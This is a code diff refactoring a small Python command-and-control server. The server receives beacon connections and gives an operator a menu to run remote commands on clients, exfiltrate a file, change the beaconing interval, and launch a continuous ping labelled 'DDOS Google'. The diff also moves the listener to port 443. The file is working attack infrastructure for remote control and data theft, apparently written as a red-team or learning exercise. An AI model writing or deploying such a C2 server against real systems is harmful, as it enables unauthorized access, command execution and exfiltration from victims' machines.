@@ -2,81 +2,88 @@ import socketserver
 import base64
 import time
 
-class MyTCPHandler(socketserver.BaseRequestHandler):
-    """ 
+class TCPHandler(socketserver.BaseRequestHandler):
+    """This class handles TCP requests and sends back commands from those requests
     """
 
     def handle(self):
-        self.data = self.request.recv(2048).strip().decode('utf-8')
-        print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))
+        self.connection_data = self.request.recv(2048).strip().decode('utf-8')
+        print("\nReceived connection from {}:{}".format(self.client_address[0], self.connection_data))
 
-        option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 
+        self.menu_input()
 
         # Run a command
-        if option == "1":
+        if self.option == "1":
+            # Get command from user and encode
             self.command = input("Enter command: ")
-            self.encodedcommand = self.encode()
 
-            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
-            self.data = self.request.recv(2048).strip().decode('utf-8')
-            print(self.data)
+            # Send command and decode results of the command
+            self.encode_send()
+            self.receive_decode()
+            print(self.received_data)
             
         # Exfil text file
-        elif option == "2":
+        elif self.option == "2":
             self.command = "type test.txt"
-            self.encodedcommand = self.encode() 
-            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+            self.encode_send() 
             
-            self.data = self.request.recv(2048).strip().decode('utf-8')
+            self.received_data = self.request.recv(2048).strip().decode('utf-8')
 
             f = open("testexfil.txt", "a")
-            f.write("\n" + self.data)
+            f.write("\n" + self.received_data)
             f.close()
             print("testexfil.txt exfiltrated")
 
         # change beaconing interval
-        elif option == "3":
+        elif self.option == "3":
 
             min = input("Minimum beaconing interval (seconds): ")
             max = input("Maximum beaconing interval (seconds): ")
             
-            if max >= min:
+            # error correction
+            if int(max) >= int(min):
                 # Tell the client we are changing the interval
                 self.command = "INTERVAL"
-                self.encodedcommand = self.encode()
-                self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+                self.encode_send()
                 time.sleep(.5)
                 self.request.sendall(bytes(min, "utf-8"))
                 self.request.sendall(bytes(max, "utf-8"))
             else:
                 print("Please enter a valid min and max")
         
-        elif option == "4":
+        elif self.option == "4":
             self.command = "PING"
-            self.encodedcommand = self.encode()
-            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+            self.encode_send()
             print("Pinging 8.8.8.8")
             
         else:
             self.command = "exit"
-            self.encodedcommand = self.encode()
-            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+            self.encode_send()
 
-    def menu():
-        print("Type exit to stop beacon")
+    def menu_input(self):
+        self.option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 
 
-    def encode(self):
+    def encode_send(self):
         self.encodedcommand = base64.b64encode(self.command.encode("utf-8")).decode("utf-8")
-        return self.encodedcommand
+        self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+
+    def receive_decode(self):
+        self.received_data = self.request.recv(2048).strip().decode('utf-8')
+
 
 if __name__ == "__main__":
-    HOST, PORT = "localhost", 9999
+    HOST = input("Listener interface (default: localhost): ")
+    if HOST == "":
+        HOST = "localhost"
+    PORT = input("Listener port (default: 443): ")
+    if PORT == "":
+        PORT = 443
 
-    # Create the server, binding to localhost on port 9999
-    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
-        # Activate the server; this will keep running until you
-        # interrupt the program with Ctrl-C
+    # Create the server, binding to localhost on port 443
+    with socketserver.TCPServer((HOST, PORT), TCPHandler) as server:
+        # Activates the server until terminated with ctrl-c
         try:
+            print(f"C2 server listening on {HOST}:{PORT}")
             server.serve_forever()
         except KeyboardInterrupt:
-            pass
+            print("\nC2 server terminated.")
